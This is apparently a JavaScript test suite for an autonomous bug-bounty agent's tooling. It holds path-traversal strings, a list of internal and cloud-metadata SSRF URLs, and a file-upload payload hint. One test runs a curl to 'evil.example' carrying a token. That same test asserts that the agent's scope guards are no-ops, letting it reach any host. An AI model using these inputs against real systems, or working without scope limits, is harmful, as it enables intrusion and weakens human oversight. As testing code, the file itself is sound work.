    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-object-access" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    const restEntry = brief.techniques.find((entry) => entry.id === "generic-rest-api");
    assert.ok(restEntry);
    assert.ok(restEntry.matched.some((match) => /hint:(idor|authz)/.test(match)));
    assert.match(JSON.stringify(restEntry.guidance), /object access|authorization/i);
  });
});

test("bounty_read_hunter_brief matches billing metadata and high-value flows to business-logic guidance", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-billing",
      hosts: [`https://app.${domain}`],
      tech_stack: ["Custom"],
      endpoints: ["/account"],
      interesting_params: ["q"],
      surface_type: "billing",
      high_value_flows: ["checkout", "refund"],
      bug_class_hints: ["business_logic"],
      evidence: ["JS route references refund and subscription flows"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-billing" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.techniques.some((entry) => entry.id === "business-logic-race"));
    assert.match(JSON.stringify(brief.techniques), /checkout|refund|business logic/i);
  });
});

test("bounty_read_hunter_brief matches upload surface_type to upload guidance", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-upload",
      hosts: [`https://assets.${domain}`],
      tech_stack: ["Custom"],
      endpoints: ["/profile"],
      interesting_params: ["q"],
      surface_type: "upload",
      high_value_flows: ["uploads"],
      bug_class_hints: ["upload"],
      evidence: ["live page contains avatar upload form"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-upload" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.techniques.some((entry) => entry.id === "upload-xss-file"));
    assert.match(JSON.stringify(brief.payload_hints), /file\.php\.jpg|Content-Type/i);
  });
});

test("bounty_read_hunter_brief falls back to generic guidance for unknown tech", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-unknown",
      hosts: [`https://unknown.${domain}`],
      tech_stack: ["Custom"],
      endpoints: ["/home"],
      interesting_params: ["q"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-unknown" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.deepEqual(brief.techniques.map((entry) => entry.id), ["generic-rest-api"]);
    assert.deepEqual(brief.techniques[0].matched, ["fallback:generic-rest-api"]);
  });
});

test("bounty_read_hunter_brief knowledge remains bounded and excludes full source docs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-rich",
      hosts: [`https://${domain}`],
      tech_stack: ["WordPress", "GraphQL", "Next.js", "JWT", "OAuth", "SSRF", "storage"],
      endpoints: [
        "/wp-json/wp/v2/users",
        "/graphql",
        "/_next/image",
        "/oauth/authorize",
        "/api/v1/users",
        "/upload",
        "/billing/checkout",
      ],
      interesting_params: ["query", "variables", "url", "redirect_uri", "user_id", "file", "amount"],
      nuclei_hits: ["swagger exposed", "graphql endpoint", "wp-json exposed"],
      js_hints: ["__NEXT_DATA__", "Bearer token handling"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-rich" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.knowledge_summary.entries_returned <= 4);
    assert.ok(brief.knowledge_summary.char_count <= brief.knowledge_summary.max_chars);
    assert.doesNotMatch(JSON.stringify(brief), /Complete reference library|Advanced Bug Bounty Hunting Techniques|scripts\/|tools\//);
  });
});

// ── filterExclusionsByHosts tests ──

test("filterExclusionsByHosts filters dead ends by surface hosts", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, {
      phase: "HUNT",
      hunt_wave: 1,
      pending_wave: 1,
      dead_ends: [
        "api.example.com - /v1/users returns 404",
        "admin.example.com - /panel gives 403",
        "All /api/* endpoints return 401",
      ],
      waf_blocked_endpoints: [
        "api.example.com - /v1/debug blocked by WAF",
        "admin.example.com - /admin/config blocked",
        "Generic WAF rule on POST",
      ],
    });

    // Create surfaces with distinct hosts
    const surfaces = [
      { id: "surface-api", hosts: ["https://api.example.com"] },
      { id: "surface-admin", hosts: ["https://admin.example.com"] },
    ];
    writeFileAtomic(
      attackSurfacePath(domain),
      `${JSON.stringify({ surfaces }, null, 2)}\n`,
    );
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-api" },
      { agent: "a2", surface_id: "surface-admin" },
    ]);

    // Agent a1 should see api.example.com dead ends + generic
    const brief1 = JSON.parse(readHunterBrief({
      target_domain: domain, wave: "w1", agent: "a1",
    }));
    assert.deepEqual(brief1.dead_ends, [
      "api.example.com - /v1/users returns 404",
      "All /api/* endpoints return 401",
    ]);
    assert.deepEqual(brief1.waf_blocked_endpoints, [
      "api.example.com - /v1/debug blocked by WAF",
      "Generic WAF rule on POST",
    ]);

    // Agent a2 should see admin.example.com dead ends + generic
    const brief2 = JSON.parse(readHunterBrief({
      target_domain: domain, wave: "w1", agent: "a2",
    }));
    assert.deepEqual(brief2.dead_ends, [
      "admin.example.com - /panel gives 403",
      "All /api/* endpoints return 401",
    ]);
    assert.deepEqual(brief2.waf_blocked_endpoints, [
      "admin.example.com - /admin/config blocked",
      "Generic WAF rule on POST",
    ]);
  });
});

test("filterExclusionsByHosts caps at limit and reports omitted count", () => {
  const entries = Array.from({ length: 150 }, (_, i) => `generic entry ${i}`);
  const result = filterExclusionsByHosts(entries, ["https://example.com"], 100);
  assert.equal(result.filtered.length, 100);
  assert.equal(result.total, 150);
  assert.equal(result.omitted, 50);
});

test("filterExclusionsByHosts handles empty and null input", () => {
  assert.deepStrictEqual(filterExclusionsByHosts([], []), { filtered: [], total: 0, omitted: 0 });
  assert.deepStrictEqual(filterExclusionsByHosts(null, []), { filtered: [], total: 0, omitted: 0 });
  assert.deepStrictEqual(filterExclusionsByHosts(undefined, []), { filtered: [], total: 0, omitted: 0 });
});

// ── Bug 1: Path traversal via target_domain ──

test("assertSafeDomain rejects path traversal sequences", () => {
  assert.throws(() => assertSafeDomain("../../etc"), /invalid path characters/);
  assert.throws(() => assertSafeDomain("foo/../bar"), /invalid path characters/);
  assert.throws(() => assertSafeDomain(".."), /invalid path characters/);
  assert.throws(() => assertSafeDomain("foo/bar"), /invalid path characters/);
  assert.throws(() => assertSafeDomain("foo\\bar"), /invalid path characters/);
});

test("assertSafeDomain accepts valid domain names", () => {
  assert.equal(assertSafeDomain("example.com"), "example.com");
  assert.equal(assertSafeDomain("sub.example.com"), "sub.example.com");
  assert.equal(assertSafeDomain("my-target.io"), "my-target.io");
});

test("sessionDir rejects path traversal in target_domain", () => {
  assert.throws(() => sessionDir("../../.ssh"), /invalid path characters/);
  assert.throws(() => sessionDir("../secrets"), /invalid path characters/);
});

test("initSession rejects path traversal domain", () => {
  withTempHome(() => {
    assert.throws(
      () => initSession({ target_domain: "../../etc", target_url: "https://evil.com" }),
      /invalid path characters/,
    );
  });
});

// ── Bug 2: writeHandoff validates domain and uses atomic writes ──

test("writeHandoff rejects missing target_domain", () => {
  withTempHome(() => {
    assert.throws(
      () => writeHandoff({ target_url: "https://example.com", session_number: 1 }),
      /target_domain/,
    );
  });
});

test("writeHandoff rejects path traversal domain", () => {
  withTempHome(() => {
    assert.throws(
      () => writeHandoff({ target_domain: "../evil", target_url: "https://example.com", session_number: 1 }),
      /invalid path characters/,
    );
  });
});

test("writeHandoff writes file atomically", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });

    writeHandoff({
      target_domain: domain,
      target_url: "https://example.com",
      session_number: 1,
      findings_summary: [{ id: "F-1", severity: "high", title: "Test" }],
    });

    const handoffPath = path.join(dir, "SESSION_HANDOFF.md");
    assert.ok(fs.existsSync(handoffPath));
    const content = fs.readFileSync(handoffPath, "utf8");
    assert.ok(content.includes("F-1"));
  });
});

// ── Bug 3: auth path resolution requires explicit target domain ──

test("resolveAuthJsonPath requires an explicit domain by default and keeps fallback legacy-only", () => {
  withTempHome((tempHome) => {
    const sessionsDir = path.join(tempHome, "bounty-agent-sessions");

    // Create two session dirs: aaa-old.com (older) and zzz-new.com (newer alphabetically but older mtime)
    const oldDir = path.join(sessionsDir, "zzz-alphabetically-last.com");
    const newDir = path.join(sessionsDir, "aaa-alphabetically-first.com");
    fs.mkdirSync(oldDir, { recursive: true });
    fs.mkdirSync(newDir, { recursive: true });

    // Touch the "aaa" dir to make it most recent
    const now = new Date();
    fs.utimesSync(oldDir, new Date(now - 60000), new Date(now - 60000));
    fs.utimesSync(newDir, now, now);

    assert.equal(resolveAuthJsonPath(null), null);
    const legacyResult = resolveAuthJsonPath(null, { allowLegacyFallback: true });
    assert.ok(legacyResult.includes("aaa-alphabetically-first.com"));
  });
});

test("auth storage rejects path traversal target domains", () => {
  withTempHome(() => {
    assert.throws(
      () => resolveAuthJsonPath("../evil"),
      /invalid path characters/,
    );
    assert.throws(
      () => authStore({ target_domain: "../evil", profile_name: "attacker", headers: { Authorization: "Bearer token" } }),
      /invalid path characters/,
    );
  });
});

// ── Bug 4: httpScan URL validation ──

const INTERNAL_SCAN_URLS = [
  "http://localhost/admin",
  "http://%6c%6f%63%61%6c%68%6f%73%74/admin",
  "http://127.0.0.1/admin",
  "http://127.1/admin",
  "http://0177.0.0.1/admin",
  "http://2130706433/admin",
  "http://0x7f000001/admin",
  "http://0.0.0.0/",
  "http://10.0.0.1/secret",
  "http://192.168.1.1/admin",
  "http://172.16.0.1/internal",
  "http://[::1]/admin",
  "http://[fc00::1]/admin",
  "http://[fd12:3456::1]/admin",
  "http://[fe80::1]/admin",
  "http://[::ffff:127.0.0.1]/admin",
  "http://[::ffff:7f00:1]/admin",
  "http://169.254.169.254/latest/meta-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://metadata/latest/meta-data/",
  "http://service.internal/api",
  "http://printer.local/status",
];

test("validateScanUrl permits localhost, private, metadata, and internal hosts by default", () => {
  for (const url of INTERNAL_SCAN_URLS) {
    assert.doesNotThrow(() => validateScanUrl(url), url);
  }
});

test("validateScanUrl rejects localhost, private, metadata, and internal hosts when requested", () => {
  for (const url of INTERNAL_SCAN_URLS) {
    assert.throws(() => validateScanUrl(url, { blockInternalHosts: true }), /Blocked internal/, url);
  }
  assert.throws(() => validateScanUrl("http://127.0.0.1/admin", { block_internal_hosts: true }), /Blocked internal/);
});

test("validateScanUrl rejects unsupported protocols", () => {
  assert.throws(() => validateScanUrl("ftp://example.com/file"), /Unsupported protocol/);
  assert.throws(() => validateScanUrl("file:///etc/passwd"), /Unsupported protocol/);
});

test("validateScanUrl accepts valid external URLs", () => {
  assert.doesNotThrow(() => validateScanUrl("https://example.com/api/v1/users"));
  assert.doesNotThrow(() => validateScanUrl("http://target.io/login"));
});

test("validateScanUrl rejects malformed URLs", () => {
  assert.throws(() => validateScanUrl("not-a-url"), /Invalid URL/);
});

test("scope guards are permissive no-ops so Bob can reach arbitrary hosts during a target run", () => {
  withTempHome((tempHome) => {
    const domain = "example.com";
    seedSessionState(domain);
    // Leftover deny-list.txt from older sessions must be ignored by the hook.
    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");

    const bashCases = [
      'curl "https://evil.example/path?token=supersecret"',
      'curl "https://blocked.example.com/admin"',
      'curl "https://crt.sh/?q=other.com"',
      "curl https://app.example.com/ok",
    ];
    for (const command of bashCases) {
      const result = runScopeGuard(command, { home: tempHome });
      assert.equal(result.status, 0, `expected ${command} to pass the bash scope guard`);
    }

    const mcpCases = [
      { target_domain: domain, method: "GET", url: "https://third-party.example.net/api" },
      { target_domain: domain, method: "GET", url: "https://blocked.example.com/admin" },
      { target_domain: domain, method: "GET", url: "https://crt.sh/?q=other.com" },
    ];
    for (const toolInput of mcpCases) {
      const result = runMcpScopeGuard(toolInput, { home: tempHome });
      assert.equal(result.status, 0, `expected ${toolInput.url} to pass the MCP scope guard`);
    }

    assert.equal(fs.existsSync(path.join(sessionDir(domain), "scope-warnings.log")), false);
  });
});

// ── Bug 5: Session lock uses owner metadata for ownership verification ──

test("session lock creates an atomic metadata lock file", () => {
  withTempHome(() => {
    const domain = "locktest.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });

    const release = acquireSessionLock(domain);
    try {
      const lockPath = sessionLockPath(domain);
      assert.ok(fs.statSync(lockPath).isFile());
      const metadata = JSON.parse(fs.readFileSync(lockPath, "utf8"));
      assert.equal(metadata.pid, process.pid);
      assert.ok(metadata.hostname);
      assert.ok(metadata.timestamp);
      assert.ok(metadata.token);
    } finally {
      release();
    }
    assert.ok(!fs.existsSync(sessionLockPath(domain)));
  });
});

test("session lock stale override uses JSON timestamp and does not remove replacement locks", () => {
  withTempHome(() => {
    const domain = "locktest.com";
    const lockPath = sessionLockPath(domain);
    fs.mkdirSync(sessionDir(domain), { recursive: true });

    fs.writeFileSync(lockPath, `${JSON.stringify({
      pid: 1,
      hostname: "old-host",
      timestamp: new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000).toISOString(),
      token: "old",
    })}\n`);
    const freshDate = new Date();
    fs.utimesSync(lockPath, freshDate, freshDate);

    const release = acquireSessionLock(domain);
    try {
      const metadata = JSON.parse(fs.readFileSync(lockPath, "utf8"));
      assert.equal(metadata.pid, process.pid);
      assert.notEqual(metadata.token, "old");
    } finally {
      release();
    }

    fs.writeFileSync(lockPath, `${JSON.stringify({
      pid: 1,
      hostname: "old-host",
      timestamp: new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000).toISOString(),
      token: "stale",
    })}\n`);
    const snapshot = readSessionLockSnapshot(lockPath);
    assert.equal(snapshot.isStale, true);

    fs.rmSync(lockPath, { force: true });
    fs.writeFileSync(lockPath, `${JSON.stringify({
      pid: process.pid,
      hostname: "new-host",
      timestamp: new Date().toISOString(),
      token: "replacement",
    })}\n`);

    assert.equal(removeStaleSessionLock(lockPath, snapshot), false);
    assert.equal(JSON.parse(fs.readFileSync(lockPath, "utf8")).token, "replacement");
  });
});

// ── Fix 1: Verification round filename mapping ──

test("verificationRoundPaths returns balanced.json for balanced round (not brutalist-final.json)", () => {
  withTempHome(() => {
    const paths = verificationRoundPaths("example.com", "balanced");
    assert.ok(paths.json.endsWith("balanced.json"), `Expected balanced.json, got ${paths.json}`);
    assert.ok(paths.markdown.endsWith("balanced.md"), `Expected balanced.md, got ${paths.markdown}`);
    assert.ok(!paths.json.includes("brutalist-final"), "Should not contain brutalist-final");
  });
});

// ── Fix 2: Finding counter race condition (sequential IDs under lock) ──

test("recordFinding produces sequential IDs without gaps when called rapidly", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    const ids = [];
    for (let i = 0; i < 5; i++) {
      const result = JSON.parse(recordFinding({
        target_domain: domain,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-a",
        title: `Finding ${i}`,
        severity: "medium",
        endpoint: `/api/test${i}`,
        description: "Test",
        proof_of_concept: "curl test",
        response_evidence: "200 OK",
        impact: "Test impact",
        validated: true,
      }));
      ids.push(result.finding_id);
    }

    assert.deepEqual(ids, ["F-1", "F-2", "F-3", "F-4", "F-5"]);
  });
});

// ── Fix 3: Session lock stale timeout ──

test("SESSION_LOCK_STALE_MS is 300 seconds", () => {
  assert.equal(SESSION_LOCK_STALE_MS, 300_000);
});

// ── Fix 6: waveStatus returns coverage data ──

test("bounty_wave_status returns coverage_pct when attack surface and state exist", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, {
      phase: "HUNT",
      hunt_wave: 1,
      pending_wave: null,
      explored: ["surface-a"],
    });

    // Seed attack surface with priorities
    const surfaces = [
      { id: "surface-a", hosts: ["https://example.com"], priority: "CRITICAL" },
      { id: "surface-b", hosts: ["https://api.example.com"], priority: "HIGH" },
      { id: "surface-c", hosts: ["https://cdn.example.com"], priority: "LOW" },
    ];
    writeFileAtomic(attackSurfacePath(domain), JSON.stringify({ surfaces }) + "\n");

    const result = JSON.parse(waveStatus({ target_domain: domain }));
    assert.ok(result.coverage != null, "coverage should not be null");
    assert.equal(result.coverage.total_surfaces, 3);
    assert.equal(result.coverage.non_low_total, 2);     // CRITICAL + HIGH
    assert.equal(result.coverage.non_low_explored, 1);   // only surface-a explored
    assert.equal(result.coverage.coverage_pct, 50);       // 1/2 = 50%
    assert.equal(result.coverage.unexplored_high, 1);     // surface-b is HIGH and unexplored
  });
});

test("bounty_wave_status coverage_pct is 100 when all surfaces are LOW", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0, pending_wave: null });

    const surfaces = [
      { id: "surface-a", hosts: ["https://cdn.example.com"], priority: "LOW" },
      { id: "surface-b", hosts: ["https://static.example.com"], priority: "LOW" },
    ];
    writeFileAtomic(attackSurfacePath(domain), JSON.stringify({ surfaces }) + "\n");

    const result = JSON.parse(waveStatus({ target_domain: domain }));
    assert.equal(result.coverage.non_low_total, 0);
    assert.equal(result.coverage.coverage_pct, 100);  // 0/0 → 100% (no non-LOW to explore)
  });
});

// ── Auth silent fallback: httpScan returns error when auth_profile not found ──

test("httpScan returns error when auth_profile is requested but not found", async () => {
  const previousHome = process.env.HOME;
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-authtest-"));
  process.env.HOME = tempHome;
  try {
    const result = await executeTool("bounty_http_scan", {
      target_domain: "example.com",
      method: "GET",
      url: "https://example.com/",
      auth_profile: "nonexistent_test_profile_xyz",
    });
    assert.equal(result.ok, false);
    assert.equal(result.error.code, "AUTH_MISSING");
    assert.ok(result.error.message.includes("not found"), `Error should mention profile not found: ${result.error.message}`);
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

// ── Verification completeness: malformed prior round is a hard error, not skipped ──

test("writeVerificationRound rejects balanced round when brutalist JSON is malformed", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "VERIFY" });
    seedFinding(domain, { severity: "high" });

    // Write valid brutalist round first
    writeVerificationRound({
      target_domain: domain,
      round: "brutalist",
      results: [{ finding_id: "F-1", disposition: "confirmed", severity: "high", reportable: true, reasoning: "Valid" }],
    });

    // Corrupt the brutalist JSON
    const brutalistPath = verificationRoundPaths(domain, "brutalist").json;
    fs.writeFileSync(brutalistPath, "NOT VALID JSON{{{");

    // Balanced round should fail because prior round is malformed (not silently skip)
    assert.throws(
      () => writeVerificationRound({
        target_domain: domain,
        round: "balanced",
        results: [{ finding_id: "F-1", disposition: "confirmed", severity: "high", reportable: true, reasoning: "Valid" }],
      }),
      /Unexpected token/,  // JSON.parse error
    );
  });
});
